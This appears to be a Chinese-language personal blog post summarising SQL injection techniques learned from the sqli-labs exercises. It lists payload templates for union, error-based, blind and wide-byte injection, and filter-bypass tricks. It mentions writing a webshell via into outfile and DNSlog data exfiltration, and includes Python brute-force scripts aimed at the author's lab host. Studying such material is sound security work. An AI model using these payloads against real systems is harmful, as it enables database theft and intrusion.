---
layout: post 
title: "sql注入总结"
date: 2020-07-06
author: su29029
tags: Web
---

## sql注入总结

刷完了sqlilab，今天来总结一下注入的相关内容。

#### 0x00 注入类别

##### 按变量类型分类

- 数字型(没有引号)
- 字符型(有引号)

##### 按提交方式分类

- GET型
- POST型
- COOKIE型

##### 按注入方式分类

- union联合查询注入
- 报错注入

+ 盲注
  + 基于时间的盲注
  + 基于布尔的盲注

##### 编码

- 宽字节注入

##### 其他

* 二次注入
* 文件读写，DNSlog

#### 0x01 可能存在注入的位置

1.GET数据

2.POST数据

3.http请求头

4.cookie

#### 0x02 引号/括号闭合方式

主要有以下7种，判断的时候除了尝试外还需要根据报错信息(如果有的话)进行快速确定。

总结一下常见的一些闭合方式：

> 1.单引号闭合```'```
>
> 2.双引号闭合```"```
>
> 3.单引号加括号```')```'
>
> 4.双引号加括号```'")```
>
> 5.括号(仅限数字型注入)```)```
>
> 6.单引号加双括号```'))```
>
> 7.双引号加括号```"))```

#### 0x03 联合查询注入的模板

联合查询注入主要借助 union select 来完成，一般payload：

```
?param=-1' union select 1,2[,3,...] %23
```

查数据库，表，列通过information_schema中的各个数据表来获取，注意回显位，以当前数据表一共4列，第二列数据会回显为例：

```sql
?param=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4 %23
?param=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="XXXX"),3,4 %23
?param=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="XXXX" and table_name="XXXXXX"),3,4 %23
```

**联合查询注入适用范围：有回显，有报错**

#### 0x04 报错注入的模板

报错注入主要借助特殊函数，构造特殊输入造成报错，将重要信息带到报错信息中，一般payload：

```sql
?param=1' and updatexml(1,concat('~',database()),1) %23
```

报错注入常用函数：   

##### updatexml()

函数原型：```UPDATEXML(XML_document, XPath_string, new_value);```
第一个参数：```XML_document```，是String格式，是XML文档对象的名称   
第二个参数：```XPath_string```，XPath格式的字符串   
第三个参数：```new_value```，String格式，替换查找到符合条件的数据   
函数作用：改变文档中符合条件的节点的值。   
注：updatexml最多只能显示32位，需要配合substr等字符串处理函数使用。   
例如：

```
http://example.com/index.php?id=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

##### extractvalue()

函数原型：```EXTRACTVALUE(XML_document, XPath_string)```   
参数含义同上。   
举例:   

```
http://example.com/index.php?id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
```

##### 几何对象

MySQL中支持的几何数据类型包括Geometry,Point,LineString,Polygon以及集合类型的MultiPoint,MultiLineString,MultiPolygon,GeometryCollection.其中Geometry可以表示任意一种几何类型，即在MySQL中，如果一个字段类型是Geometry，则可以存储Point、LineString等其它几何类型的值。其他的几种则需要固定有效的表示格式。   
我们可以借助几何对象的相关函数进行报错注入。   
geometrycollection():```id=1 and geometrycollection((select * from(select * from(select user())a)b))```   
multipoint():```id=1 and multipoint((select * from(select * from(select user())a)b))```   
polygon():```id=1 and polygon((select * from(select * from(select user())a)b))```   
multipolygon():```id=1 and multipolygon((select * from(select * from(select user())a)b))```   
linestring():```id=1 and linestring((select * from(select * from(select user())a)b))```   
multilinestring():```id=1 and multilinestring((select * from(select * from(select user())a)b))```   

##### exp()

例子：
```id=1 and exp(~(select * from(select user())a))```   

**报错注入适用范围：无回显，但可以获得详细报错信息。**

#### 0x05 盲注

盲注主要分为布尔盲注，时间盲注，其中布尔盲注通过页面报错or不报错(或者显示不同信息)来判断某一次查询结果是否为真，时间盲注通过请求响应时间来判断某一次猜解是否正确。

盲注要灵活运用字符串处理函数，例如substr,left,right。

通用payload：

```sql
?param=1' and if(ascii(substr(database(),{pos},1))>{val},1,0) %23 # 布尔，借助if函数(if被过滤可使用case when)
?param=1' and ascii(substr(database(),{pos},1)>{val}) and sleep(3) %23 # 时间，如果第二部分为真则被短路第三部分不执行，否则执行第三部分
```

通过变换pos和val的值完成对某一项信息的逐位猜解。主要借助二分法来完成某一位pos的值的判断，效率较高。

举一个例子，V1lu0实验室招新hard_sql，第一步爆破数据库名的脚本：

```python
import requests

for i in range(1, 10):
    for j in range(32, 127):
        payload = "?user=1' and if(ascii(substr(database(), {},1))={},pow(999,999),1) %23&pass=123".format(i, j)
        url = "http://v8.su29029.xyz:10010/index.php" + payload
        r = requests.get(url)
        # print(j, end = " ")
        if (r.text.find('Something wrong') != -1):
            print(chr(j))
```
这个脚本主要是报错盲注，题目的提示是，语句为真则登录成功，语句为假则返回失败，语句出错则返回something wrong。   

这里是直接通过逐位爆破完成的盲注，二分法的脚本如下：

```python
import requests

res = ''
for i in range(1, 10):
    min=65
    max=127
    while(abs(max - min) > 1):
        mid = (max + min)//2
        payload = "?user=1' and if(ascii(substr(database(), {},1))>{},pow(999,999),1) %23&pass=123".format(i, mid)
        url = "http://v8.su29029.xyz:10010/index.php" + payload
        r = requests.get(url)
        # print(mid, end = " ")
        if (r.text.find('Something wrong') != -1):
            min=mid
        else:
            max=mid
res += chr(max)
print(res)
```

#### 0x06 宽字节注入

宽字节注入主要借助GBK编码，由于mysql的识别错误(错误地将两个url编码字符识别成一个，从而吞掉原本的转义字符或特殊的防注入字符)，导致注入。

通用payload：

```sql
?param=1%df' union select 1,2,3 %23
```

#### 0x07 二次注入

二次注入主要是利用逻辑漏洞，向数据库中插入脏数据，程序运行中二次去除了脏数据缺未过滤，导致恶意sql代码被执行。常见于用户修改密码逻辑，注册逻辑等。

#### 0x08 文件读写，DNSlog

mysql中load_file()函数可以用于读取本地文件，into outfile 可以向本地写入文件，例如写入一句话木马。

load_file()函数的一个应用是在Windows系统中通过访问由重要信息拼接而成的url，访问url需要进行dns解析，通过查看解析记录即可获取到重要信息。(具体可以参见上一篇博客sqliab学习总结（三）)。

#### 0x09 过滤问题

主要绕过方法：双写绕过，任意大小写绕过，相同功能函数绕过，可代替字符绕过。

1.空格，注释，引号，逗号，等号，大于号，小于号

空格主要通过%a0绕过，成功率高。也可通过/**/，以及巧用括号的方式绕过

避免使用注释的方法主要是巧妙闭合单引号。

引号的绕过主要可以通过括号，或者单双引号逃逸的方法。

逗号的绕过主要可以通过join完成，例如：

```sql
union select * from (select 1)a join (select 2)b join (select 3)
```

对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。

等号主要通过like绕过。

大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。

2.union select

尝试两个单词之间加%0a，任意大小写，双写。

3.and or

and可以通过&&替代，or可以通过||替代。

4.if

使用case when代替

其余关于过滤的内容见[明天的笔记](https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-7-8-sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98.md)
